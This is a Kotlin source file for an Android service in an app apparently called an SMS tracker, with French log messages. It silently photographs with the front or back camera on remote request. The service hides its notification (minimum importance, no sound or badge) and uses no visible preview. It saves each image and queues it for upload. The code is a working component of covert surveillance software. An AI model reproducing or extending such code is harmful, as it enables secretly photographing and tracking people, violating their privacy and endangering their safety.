package com.safi.smstracker

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.Camera
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CameraCaptureService : Service() {

    companion object {
        private const val TAG = "SAFI_CAMERA"
        private const val CHANNEL_ID = "SAFI_CAMERA_CHANNEL"
        private const val NOTIF_ID = 1338
        
        const val FACING_FRONT = 0
        const val FACING_BACK = 1
        
        fun takePhoto(context: Context, useFront: Boolean = true) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "❌ Permission caméra manquante")
                return
            }
            
            val intent = Intent(context, CameraCaptureService::class.java).apply {
                putExtra("USE_FRONT", useFront)
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "📸 Demande de prise de vue envoyée")
        }
        
        fun capturePhoto(context: Context, facing: Int) {
            takePhoto(context, useFront = (facing == FACING_FRONT))
        }
    }

    private var camera: Camera? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getBooleanExtra("USE_FRONT", true)?.let { useFront ->
            capturePhotoInternal(useFront)
        }
        return START_NOT_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SAFI — Caméra à distance",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Prise de photos en arrière-plan"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SAFI — Caméra active")
            .setContentText("Prise de photo en cours...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    private fun capturePhotoInternal(useFront: Boolean) {
        try {
            val cameraId = if (useFront) findFrontCamera() else findBackCamera()
            if (cameraId == -1) {
                Log.e(TAG, "❌ Caméra non disponible")
                stopSelf()
                return
            }

            camera = Camera.open(cameraId)
            camera?.setPreviewDisplay(null)
            camera?.startPreview()
            
            camera?.takePicture(null, null, { data, cam ->
                try {
                    val photosDir = File(filesDir, "received_photos")
                    if (!photosDir.exists()) photosDir.mkdirs()
                    
                    val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.FRANCE).format(Date())
                    val suffix = if (useFront) "AVANT" else "ARRIERE"
                    val photoFile = File(photosDir, "IMG_${timeStamp}_${suffix}.jpg")
                    
                    val fos = FileOutputStream(photoFile)
                    fos.write(data)
                    fos.close()
                    
                    Log.d(TAG, "✅ Photo sauvegardée: ${photoFile.absolutePath}")
                    
                    MainMapActivity.instance?.onPhotoReceived(photoFile)
                    PhotoUploadService.addPhotoToQueue(this, photoFile)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Erreur sauvegarde photo", e)
                } finally {
                    cam.release()
                    camera = null
                    stopSelf()
                }
            })
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur ouverture caméra", e)
            stopSelf()
        }
    }

    private fun findFrontCamera(): Int {
        for (i in 0 until Camera.getNumberOfCameras()) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i
        }
        return findBackCamera()
    }

    private fun findBackCamera(): Int {
        for (i in 0 until Camera.getNumberOfCameras()) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i
        }
        return 0
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
